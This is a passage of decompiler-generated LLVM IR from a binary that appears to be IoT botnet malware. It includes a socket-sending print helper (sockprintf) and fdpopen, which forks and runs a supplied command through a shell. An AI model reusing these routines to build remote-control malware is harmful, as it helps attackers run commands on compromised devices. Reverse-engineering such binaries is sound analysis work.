  %v2_1000118413 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_1000118413, 48
  br i1 %tmp62, label %dec_label_pc_100011a8, label %dec_label_pc_10001194

dec_label_pc_1000114c:                            ; preds = %dec_label_pc_10001194
  %v1_10001150 = mul i32 %stack_var_-48.018, 10
  %v2_1000115c = load i8, i8* %stack_var_-68.119, align 1
  %v3_1000115c = zext i8 %v2_1000115c to i32
  %v2_10001168 = add i32 %v1_10001150, -48
  %v1_1000116c = add i32 %v2_10001168, %v3_1000115c
  %v1_10001178 = add i32 %v4_1000118020, 1
  %v5_1000117c = inttoptr i32 %v1_10001178 to i8*
  %v2_10001184 = load i8, i8* %v5_1000117c, align 1
  %tmp63 = icmp ult i8 %v2_10001184, 48
  br i1 %tmp63, label %dec_label_pc_100011a8, label %dec_label_pc_10001194

dec_label_pc_10001194:                            ; preds = %dec_label_pc_10001180.preheader, %dec_label_pc_1000114c
  %v4_1000118020 = phi i32 [ %v1_10001178, %dec_label_pc_1000114c ], [ %v4_1000118012, %dec_label_pc_10001180.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_1000117c, %dec_label_pc_1000114c ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10001180.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_1000116c, %dec_label_pc_1000114c ], [ 0, %dec_label_pc_10001180.preheader ]
  %v2_10001198 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10001198, 58
  br i1 %tmp64, label %dec_label_pc_1000114c, label %dec_label_pc_100011a8

dec_label_pc_100011a8:                            ; preds = %dec_label_pc_1000114c, %dec_label_pc_10001194, %dec_label_pc_10001180.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10001180.preheader ], [ %v1_1000116c, %dec_label_pc_1000114c ], [ %stack_var_-48.018, %dec_label_pc_10001194 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10001180.preheader ], [ %v5_1000117c, %dec_label_pc_1000114c ], [ %stack_var_-68.119, %dec_label_pc_10001194 ]
  %v2_100011ac = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100011b4 = icmp eq i8 %v2_100011ac, 115
  br i1 %v3_100011b4, label %dec_label_pc_100011bc, label %dec_label_pc_1000127c

dec_label_pc_100011bc:                            ; preds = %dec_label_pc_100011a8
  %v2_100011c0 = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_100011c0, 7
  br i1 %tmp65, label %dec_label_pc_10001208, label %dec_label_pc_100011d0

dec_label_pc_100011d0:                            ; preds = %dec_label_pc_100011bc
  %v3_100011d4 = load i32, i32* %v2_100011d4, align 4
  %v2_100011dc = load i8, i8* %tmp, align 1
  %v3_100011dc = zext i8 %v2_100011dc to i32
  %v1_100011e8 = mul nuw nsw i32 %v3_100011dc, 4
  %v2_100011ec = add i32 %v1_100011e8, %v3_100011d4
  %v1_100011f4 = add i8 %v2_100011dc, 1
  store i8 %v1_100011f4, i8* %tmp, align 1
  br label %dec_label_pc_10001220

dec_label_pc_10001208:                            ; preds = %dec_label_pc_100011bc
  %v3_1000120c = load i32, i32* %v2_1000120c, align 4
  %v1_10001214 = add i32 %v3_1000120c, 4
  store i32 %v1_10001214, i32* %v2_1000120c, align 4
  br label %dec_label_pc_10001220

dec_label_pc_10001220:                            ; preds = %dec_label_pc_100011d0, %dec_label_pc_10001208
  %stack_var_-20.0 = phi i32 [ %v3_1000120c, %dec_label_pc_10001208 ], [ %v2_100011ec, %dec_label_pc_100011d0 ]
  %v1_10001224 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10001224 = load i32, i32* %v1_10001224, align 4
  %v3_10001230 = icmp eq i32 %v2_10001224, 0
  br i1 %v3_10001230, label %dec_label_pc_10001244, label %dec_label_pc_10001238

dec_label_pc_10001238:                            ; preds = %dec_label_pc_10001220
  %v5_1000123c = inttoptr i32 %v2_10001224 to i8*
  br label %dec_label_pc_10001250

dec_label_pc_10001244:                            ; preds = %dec_label_pc_10001220
  br label %dec_label_pc_10001250

dec_label_pc_10001250:                            ; preds = %dec_label_pc_10001238, %dec_label_pc_10001244
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017700.28, i32 0, i32 0), %dec_label_pc_10001244 ], [ %v5_1000123c, %dec_label_pc_10001238 ]
  %v6_10001264 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10001270 = add i32 %v6_10001264, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_1000127c:                            ; preds = %dec_label_pc_100011a8
  %v2_10001280 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10001288 = icmp eq i8 %v2_10001280, 100
  br i1 %v3_10001288, label %dec_label_pc_10001290, label %dec_label_pc_10001330

dec_label_pc_10001290:                            ; preds = %dec_label_pc_1000127c
  %v2_10001294 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10001294, 7
  br i1 %tmp66, label %dec_label_pc_100012dc, label %dec_label_pc_100012a4

dec_label_pc_100012a4:                            ; preds = %dec_label_pc_10001290
  %v3_100012a8 = load i32, i32* %v2_100011d4, align 4
  %v2_100012b0 = load i8, i8* %tmp, align 1
  %v3_100012b0 = zext i8 %v2_100012b0 to i32
  %v1_100012bc = mul nuw nsw i32 %v3_100012b0, 4
  %v2_100012c0 = add i32 %v1_100012bc, %v3_100012a8
  %v1_100012c8 = add i8 %v2_100012b0, 1
  store i8 %v1_100012c8, i8* %tmp, align 1
  br label %dec_label_pc_100012f4

dec_label_pc_100012dc:                            ; preds = %dec_label_pc_10001290
  %v3_100012e0 = load i32, i32* %v2_1000120c, align 4
  %v1_100012e8 = add i32 %v3_100012e0, 4
  store i32 %v1_100012e8, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100012f4

dec_label_pc_100012f4:                            ; preds = %dec_label_pc_100012a4, %dec_label_pc_100012dc
  %stack_var_-28.0 = phi i32 [ %v3_100012e0, %dec_label_pc_100012dc ], [ %v2_100012c0, %dec_label_pc_100012a4 ]
  %v1_100012f8 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_100012f8 = load i32, i32* %v1_100012f8, align 4
  %v7_10001318 = call i32 @printi(i32 %tmp41, i32 %v2_100012f8, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10001324 = add i32 %v7_10001318, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000127c
  %v2_10001334 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000133c = icmp eq i8 %v2_10001334, 120
  br i1 %v3_1000133c, label %dec_label_pc_10001344, label %dec_label_pc_100013e4

dec_label_pc_10001344:                            ; preds = %dec_label_pc_10001330
  %v2_10001348 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10001348, 7
  br i1 %tmp67, label %dec_label_pc_10001390, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001344
  %v3_1000135c = load i32, i32* %v2_100011d4, align 4
  %v2_10001364 = load i8, i8* %tmp, align 1
  %v3_10001364 = zext i8 %v2_10001364 to i32
  %v1_10001370 = mul nuw nsw i32 %v3_10001364, 4
  %v2_10001374 = add i32 %v1_10001370, %v3_1000135c
  %v1_1000137c = add i8 %v2_10001364, 1
  store i8 %v1_1000137c, i8* %tmp, align 1
  br label %dec_label_pc_100013a8

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001344
  %v3_10001394 = load i32, i32* %v2_1000120c, align 4
  %v1_1000139c = add i32 %v3_10001394, 4
  store i32 %v1_1000139c, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100013a8

dec_label_pc_100013a8:                            ; preds = %dec_label_pc_10001358, %dec_label_pc_10001390
  %stack_var_-32.0 = phi i32 [ %v3_10001394, %dec_label_pc_10001390 ], [ %v2_10001374, %dec_label_pc_10001358 ]
  %v1_100013ac = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_100013ac = load i32, i32* %v1_100013ac, align 4
  %v7_100013cc = call i32 @printi(i32 %tmp41, i32 %v2_100013ac, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_100013d8 = add i32 %v7_100013cc, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_10001330
  %v2_100013e8 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100013f0 = icmp eq i8 %v2_100013e8, 88
  br i1 %v3_100013f0, label %dec_label_pc_100013f8, label %dec_label_pc_10001498

dec_label_pc_100013f8:                            ; preds = %dec_label_pc_100013e4
  %v2_100013fc = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_100013fc, 7
  br i1 %tmp68, label %dec_label_pc_10001444, label %dec_label_pc_1000140c

dec_label_pc_1000140c:                            ; preds = %dec_label_pc_100013f8
  %v3_10001410 = load i32, i32* %v2_100011d4, align 4
  %v2_10001418 = load i8, i8* %tmp, align 1
  %v3_10001418 = zext i8 %v2_10001418 to i32
  %v1_10001424 = mul nuw nsw i32 %v3_10001418, 4
  %v2_10001428 = add i32 %v1_10001424, %v3_10001410
  %v1_10001430 = add i8 %v2_10001418, 1
  store i8 %v1_10001430, i8* %tmp, align 1
  br label %dec_label_pc_1000145c

dec_label_pc_10001444:                            ; preds = %dec_label_pc_100013f8
  %v3_10001448 = load i32, i32* %v2_1000120c, align 4
  %v1_10001450 = add i32 %v3_10001448, 4
  store i32 %v1_10001450, i32* %v2_1000120c, align 4
  br label %dec_label_pc_1000145c

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_1000140c, %dec_label_pc_10001444
  %stack_var_-36.0 = phi i32 [ %v3_10001448, %dec_label_pc_10001444 ], [ %v2_10001428, %dec_label_pc_1000140c ]
  %v1_10001460 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10001460 = load i32, i32* %v1_10001460, align 4
  %v7_10001480 = call i32 @printi(i32 %tmp41, i32 %v2_10001460, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_1000148c = add i32 %v7_10001480, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001498:                            ; preds = %dec_label_pc_100013e4
  %v2_1000149c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_100014a4 = icmp eq i8 %v2_1000149c, 117
  br i1 %v3_100014a4, label %dec_label_pc_100014ac, label %dec_label_pc_1000154c

dec_label_pc_100014ac:                            ; preds = %dec_label_pc_10001498
  %v2_100014b0 = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_100014b0, 7
  br i1 %tmp69, label %dec_label_pc_100014f8, label %dec_label_pc_100014c0

dec_label_pc_100014c0:                            ; preds = %dec_label_pc_100014ac
  %v3_100014c4 = load i32, i32* %v2_100011d4, align 4
  %v2_100014cc = load i8, i8* %tmp, align 1
  %v3_100014cc = zext i8 %v2_100014cc to i32
  %v1_100014d8 = mul nuw nsw i32 %v3_100014cc, 4
  %v2_100014dc = add i32 %v1_100014d8, %v3_100014c4
  %v1_100014e4 = add i8 %v2_100014cc, 1
  store i8 %v1_100014e4, i8* %tmp, align 1
  br label %dec_label_pc_10001510

dec_label_pc_100014f8:                            ; preds = %dec_label_pc_100014ac
  %v3_100014fc = load i32, i32* %v2_1000120c, align 4
  %v1_10001504 = add i32 %v3_100014fc, 4
  store i32 %v1_10001504, i32* %v2_1000120c, align 4
  br label %dec_label_pc_10001510

dec_label_pc_10001510:                            ; preds = %dec_label_pc_100014c0, %dec_label_pc_100014f8
  %stack_var_-40.0 = phi i32 [ %v3_100014fc, %dec_label_pc_100014f8 ], [ %v2_100014dc, %dec_label_pc_100014c0 ]
  %v1_10001514 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10001514 = load i32, i32* %v1_10001514, align 4
  %v7_10001534 = call i32 @printi(i32 %tmp41, i32 %v2_10001514, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10001540 = add i32 %v7_10001534, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_1000154c:                            ; preds = %dec_label_pc_10001498
  %v2_10001550 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10001558 = icmp eq i8 %v2_10001550, 99
  br i1 %v3_10001558, label %dec_label_pc_10001560, label %dec_label_pc_1000162c

dec_label_pc_10001560:                            ; preds = %dec_label_pc_1000154c
  %v2_10001564 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10001564, 7
  br i1 %tmp70, label %dec_label_pc_100015ac, label %dec_label_pc_10001574

dec_label_pc_10001574:                            ; preds = %dec_label_pc_10001560
  %v3_10001578 = load i32, i32* %v2_100011d4, align 4
  %v2_10001580 = load i8, i8* %tmp, align 1
  %v3_10001580 = zext i8 %v2_10001580 to i32
  %v1_1000158c = mul nuw nsw i32 %v3_10001580, 4
  %v2_10001590 = add i32 %v1_1000158c, %v3_10001578
  %v1_10001598 = add i8 %v2_10001580, 1
  store i8 %v1_10001598, i8* %tmp, align 1
  br label %dec_label_pc_100015c4

dec_label_pc_100015ac:                            ; preds = %dec_label_pc_10001560
  %v3_100015b0 = load i32, i32* %v2_1000120c, align 4
  %v1_100015b8 = add i32 %v3_100015b0, 4
  store i32 %v1_100015b8, i32* %v2_1000120c, align 4
  br label %dec_label_pc_100015c4

dec_label_pc_100015c4:                            ; preds = %dec_label_pc_10001574, %dec_label_pc_100015ac
  %stack_var_-44.0 = phi i32 [ %v3_100015b0, %dec_label_pc_100015ac ], [ %v2_10001590, %dec_label_pc_10001574 ]
  %v1_100015c8 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_100015c8 = load i32, i32* %v1_100015c8, align 4
  %v1_100015cc = urem i32 %v2_100015c8, 256
  store i32 %v1_100015cc, i32* %stack_var_-88, align 4
  %v5_100015f0 = call i32 @prints(i32 %tmp41, i8* %v4_100015f0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_100015fc = add i32 %v5_100015f0, %stack_var_-56.132
  br label %dec_label_pc_1000162c

dec_label_pc_10001608:                            ; preds = %dec_label_pc_10001098, %dec_label_pc_100010dc
  %stack_var_-68.2 = phi i8* [ %v5_100010b4, %dec_label_pc_100010dc ], [ %stack_var_-68.434, %dec_label_pc_10001098 ]
  %v2_1000160c = load i8, i8* %stack_var_-68.2, align 1
  %v3_1000160c = zext i8 %v2_1000160c to i32
  %v3_1000161c = call i32 @printchar(i32* %arg1, i32 %v3_1000160c)
  %v1_10001624 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_1000162c

dec_label_pc_1000162c:                            ; preds = %dec_label_pc_1000154c, %dec_label_pc_100015c4, %dec_label_pc_10001510, %dec_label_pc_1000145c, %dec_label_pc_100013a8, %dec_label_pc_100012f4, %dec_label_pc_10001250, %dec_label_pc_10001608
  %stack_var_-56.0 = phi i32 [ %v1_10001624, %dec_label_pc_10001608 ], [ %v2_10001270, %dec_label_pc_10001250 ], [ %v2_10001324, %dec_label_pc_100012f4 ], [ %v2_100013d8, %dec_label_pc_100013a8 ], [ %v2_1000148c, %dec_label_pc_1000145c ], [ %v2_10001540, %dec_label_pc_10001510 ], [ %v2_100015fc, %dec_label_pc_100015c4 ], [ %stack_var_-56.132, %dec_label_pc_1000154c ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10001608 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10001250 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100012f4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100013a8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000145c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10001510 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_100015c4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000154c ]
  %v4_1000162c = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10001630 = add i32 %v4_1000162c, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10001630 to i8*
  %v2_1000163c = load i8, i8* %stack_var_-68.4, align 1
  %v3_10001644 = icmp eq i8 %v2_1000163c, 0
  br i1 %v3_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001098

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_100010ac, %dec_label_pc_1000162c, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_100010ac ], [ %stack_var_-56.0, %dec_label_pc_1000162c ]
  %v3_10001650 = icmp eq i32* %arg1, null
  br i1 %v3_10001650, label %dec_label_pc_10001668, label %dec_label_pc_10001658

dec_label_pc_10001658:                            ; preds = %dec_label_pc_1000164c
  %v2_1000165c = load i32, i32* %arg1, align 4
  %v3_10001664 = inttoptr i32 %v2_1000165c to i8*
  store i8 0, i8* %v3_10001664, align 1
  br label %dec_label_pc_10001668

dec_label_pc_10001668:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_10001658
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10001120, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_100010b4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_1000120c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10001668, { 1, 0 }
  uselistorder label %dec_label_pc_1000164c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000162c, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10001608, { 1, 0 }
  uselistorder label %dec_label_pc_100015c4, { 1, 0 }
  uselistorder label %dec_label_pc_10001510, { 1, 0 }
  uselistorder label %dec_label_pc_1000145c, { 1, 0 }
  uselistorder label %dec_label_pc_100013a8, { 1, 0 }
  uselistorder label %dec_label_pc_100012f4, { 1, 0 }
  uselistorder label %dec_label_pc_10001250, { 1, 0 }
  uselistorder label %dec_label_pc_10001220, { 1, 0 }
  uselistorder label %dec_label_pc_100011a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001194, { 1, 0 }
  uselistorder label %dec_label_pc_1000111c, { 1, 0 }
  uselistorder label %dec_label_pc_10001098, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001708 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268441364, i32* @lr, align 4
  %v4_10001710 = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001708)
  ret i32 %v4_10001710

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_100017b8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268441540, i32* @lr, align 4
  %v4_100017c0 = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_100017b8)
  ret i32 %v4_100017c0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 268441668, i32* @lr, align 4
  %v1_10001840 = call i32 @malloc(i32 2048)
  store i32 %v1_10001840, i32* %stack_var_-144, align 4
  store i32 268441700, i32* @lr, align 4
  %v3_10001860 = call i32 @__GI_memset(i32 %v1_10001840, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001894 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268441768, i32* @lr, align 4
  %v4_100018a4 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001894)
  store i32 %v1_10001840, i32* @r3, align 4
  %v0_100018ac = call i32 @__GI_strlen()
  %v2_100018bc = add i32 %v0_100018ac, %v1_10001840
  %v3_100018c4 = inttoptr i32 %v2_100018bc to i8*
  store i8 10, i8* %v3_100018c4, align 1
  store i32 %v1_10001840, i32* @r3, align 4
  %v0_100018cc = call i32 @__GI_strlen()
  store i32 268441832, i32* @lr, align 4
  %v4_100018e4 = call i32 @__libc_send(i32 %arg1, i32 %v1_10001840, i32 %v0_100018cc, i32 16384)
  store i32 268441848, i32* @lr, align 4
  %v1_100018f4 = call i32 @free(i32 %v1_10001840)
  ret i32 %v4_100018e4

; uselistorder directives
  uselistorder i32 %v1_10001840, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @print, { 2, 0, 1 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_10001938 = load i8, i8* %arg2, align 1
  %v3_10001940 = icmp eq i8 %v2_10001938, 114
  br i1 %v3_10001940, label %dec_label_pc_1000195c, label %dec_label_pc_10001948

dec_label_pc_10001948:                            ; preds = %entry
  %v2_1000194c = load i8, i8* %arg2, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 119
  br i1 %v3_10001954, label %dec_label_pc_1000195c, label %dec_label_pc_10001974

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948, %entry
  %v1_10001960 = add i32 %tmp, 1
  %v2_10001960 = inttoptr i32 %v1_10001960 to i8*
  %v3_10001964 = load i8, i8* %v2_10001960, align 1
  %v3_1000196c = icmp eq i8 %v3_10001964, 0
  br i1 %v3_1000196c, label %dec_label_pc_10001980, label %dec_label_pc_10001974

dec_label_pc_10001974:                            ; preds = %dec_label_pc_10001948, %dec_label_pc_1000195c
  br label %dec_label_pc_10001ba4

dec_label_pc_10001980:                            ; preds = %dec_label_pc_1000195c
  %v2_10001980 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268441996, i32* @lr, align 4
  %v3_10001988 = call i32 @__GI_pipe(i32 %v2_10001980, i32 %v1_10001960)
  store i32 %v3_10001988, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001988, -1
  br i1 %tmp15, label %dec_label_pc_100019a4, label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_10001980
  br label %dec_label_pc_10001ba4

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_10001980
  %v3_100019a8 = load i32, i32* @global_var_1002b918.29, align 4
  %v3_100019ac = icmp eq i32 %v3_100019a8, 0
  br i1 %v3_100019ac, label %dec_label_pc_100019b4, label %dec_label_pc_10001a34

dec_label_pc_100019b4:                            ; preds = %dec_label_pc_100019a4
  store i32 268442040, i32* @lr, align 4
  %v1_100019b4 = call i32 @getdtablesize(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_100019c4 = icmp sgt i32 %v1_100019b4, 0
  br i1 %v2_100019c4, label %dec_label_pc_100019d8, label %dec_label_pc_100019cc

dec_label_pc_100019cc:                            ; preds = %dec_label_pc_100019b4
  br label %dec_label_pc_10001ba4

dec_label_pc_100019d8:                            ; preds = %dec_label_pc_100019b4
  %v1_100019dc = mul i32 %v1_100019b4, 4
  store i32 268442088, i32* @lr, align 4
  %v1_100019e4 = call i32 @malloc(i32 %v1_100019dc)
  store i32 %v1_100019e4, i32* @global_var_1002b918.29, align 4
  %v3_100019fc = icmp eq i32 %v1_100019e4, 0
  br i1 %v3_100019fc, label %dec_label_pc_10001a04, label %dec_label_pc_10001a10

dec_label_pc_10001a04:                            ; preds = %dec_label_pc_100019d8
  br label %dec_label_pc_10001ba4

dec_label_pc_10001a10:                            ; preds = %dec_label_pc_100019d8
  store i32 ptrtoint (i32* @global_var_10001a34.30 to i32), i32* @lr, align 4
  %v3_10001a30 = call i32 @__GI_memset(i32 %v1_100019e4, i32 0, i32 %v1_100019dc)
  store i32 %v3_10001a30, i32* @r3, align 4
  br label %dec_label_pc_10001a34

dec_label_pc_10001a34:                            ; preds = %dec_label_pc_100019a4, %dec_label_pc_10001a10
  store i32 268442168, i32* @lr, align 4
  %v0_10001a34 = call i32 @__vfork()
  %v4_10001a50 = icmp eq i32 %v0_10001a34, -1
  br i1 %v4_10001a50, label %dec_label_pc_10001a68, label %dec_label_pc_10001a58

dec_label_pc_10001a58:                            ; preds = %dec_label_pc_10001a34
  %v3_10001a5c = icmp eq i32 %v0_10001a34, 0
  br i1 %v3_10001a5c, label %dec_label_pc_10001a8c, label %dec_label_pc_10001b3c

dec_label_pc_10001a68:                            ; preds = %dec_label_pc_10001a34
  %v3_10001a68 = load i32, i32* %stack_var_-48, align 4
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @__libc_close(i32 %v3_10001a68)
  store i32 ptrtoint (i32* @global_var_10001a80.31 to i32), i32* @lr, align 4
  %v1_10001a7c = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001ba4

dec_label_pc_10001a8c:                            ; preds = %dec_label_pc_10001a58
  %v3_10001a90 = load i8, i8* %arg2, align 1
  %v3_10001a98 = icmp eq i8 %v3_10001a90, 114
  br i1 %v3_10001a98, label %dec_label_pc_10001aa0, label %dec_label_pc_10001ad8

dec_label_pc_10001aa0:                            ; preds = %dec_label_pc_10001a8c
  %v3_10001aa4 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001aa4, label %dec_label_pc_10001ac8, label %dec_label_pc_10001aac

dec_label_pc_10001aac:                            ; preds = %dec_label_pc_10001aa0
  store i32 268442300, i32* @lr, align 4
  %v4_10001ab8 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268442312, i32* @lr, align 4
  %v1_10001ac4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001ac8

dec_label_pc_10001ac8:                            ; preds = %dec_label_pc_10001aa0, %dec_label_pc_10001aac
  %v3_10001ac8 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001ad4.32 to i32), i32* @lr, align 4
  %v1_10001ad0 = call i32 @__libc_close(i32 %v3_10001ac8)
  br label %dec_label_pc_10001b0c

dec_label_pc_10001ad8:                            ; preds = %dec_label_pc_10001a8c
  %v3_10001ad8 = load i32, i32* %stack_var_-48, align 4
  %v3_10001adc = icmp eq i32 %v3_10001ad8, 0
  br i1 %v3_10001adc, label %dec_label_pc_10001b00, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %dec_label_pc_10001ad8
  store i32 268442356, i32* @lr, align 4
  %v4_10001af0 = call i32 @dup2(i32 %v3_10001ad8, i32 0, i32 %tmp)
  %v3_10001af4 = load i32, i32* %stack_var_-48, align 4
  store i32 268442368, i32* @lr, align 4
  %v1_10001afc = call i32 @__libc_close(i32 %v3_10001af4)
  br label %dec_label_pc_10001b00

dec_label_pc_10001b00:                            ; preds = %dec_label_pc_10001ad8, %dec_label_pc_10001ae4
  store i32 268442380, i32* @lr, align 4
  %v1_10001b08 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001b0c

dec_label_pc_10001b0c:                            ; preds = %dec_label_pc_10001ac8, %dec_label_pc_10001b00
  %v8_10001b30 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10017708.33 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017130.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017710.35 to i32), i32 %arg1, i32 0)
  %v1_10001b38 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_10001b3c

dec_label_pc_10001b3c:                            ; preds = %dec_label_pc_10001a58, %dec_label_pc_10001b0c
  %v2_10001b40 = load i8, i8* %arg2, align 1
  %v3_10001b48 = icmp eq i8 %v2_10001b40, 114
  %v3_10001b50 = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_10001b48, label %dec_label_pc_10001b50, label %dec_label_pc_10001b68

dec_label_pc_10001b50:                            ; preds = %dec_label_pc_10001b3c
  store i32 ptrtoint (i32* @global_var_10001b64.37 to i32), i32* @lr, align 4
